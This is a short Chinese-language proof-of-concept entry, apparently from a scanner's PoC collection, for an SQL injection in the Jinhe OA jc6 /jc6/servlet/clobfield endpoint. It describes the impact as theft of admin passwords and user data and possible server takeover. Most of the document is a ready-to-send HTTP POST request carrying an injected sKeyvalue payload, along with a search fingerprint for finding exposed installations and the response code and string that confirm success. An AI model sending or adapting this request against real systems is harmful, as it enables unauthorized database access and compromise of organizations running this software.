﻿# 金和OA jc6 SQL注入

> 更新时间：2023-12-20

> 漏洞编号：

> 漏洞说明：金和 OA jc6 /jc6/servlet/clobfield接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

> 漏洞特征：title="金和协同管理平台"

> 验证脚本：HTTP

```
POST /jc6/servlet/clobfield HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
SL-CE-SUID: 77

key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','12345'))))--+
```

> 响应代码特征：200

> 响应内容特征：e5b086206e766172

> 上传文件定位：


> 验证文件来源：金和OA jc6 SQL注入.poc
